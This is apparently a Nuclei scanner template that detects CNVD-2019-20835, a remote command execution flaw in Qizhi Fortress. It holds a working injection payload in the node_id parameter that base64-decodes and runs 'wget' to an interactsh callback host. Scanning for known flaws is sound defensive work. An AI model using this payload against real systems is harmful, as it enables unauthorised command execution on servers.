id: CNVD-2019-20835

info:
  name: Qizhi Fortress Front Remote Command Execution
  author: daffainfo
  severity: critical
  reference: https://www.cnblogs.com/StudyCat/p/11256944.html
  tags: cnvd,cnvd2019,rce,qizhi

requests:
  - raw:
      - |
        GET /ha_request.php?action=install&ipaddr=10.20.10.11&node_id=1${IFS}|`echo${IFS}"{{base64("wget http://{{interactsh-url}}")}}"|base64${IFS}-d|bash`|${IFS}|echo${IFS} HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200

      - type: word
        part: interactsh_protocol  # Confirms the HTTP Interaction
        words:
          - "http"
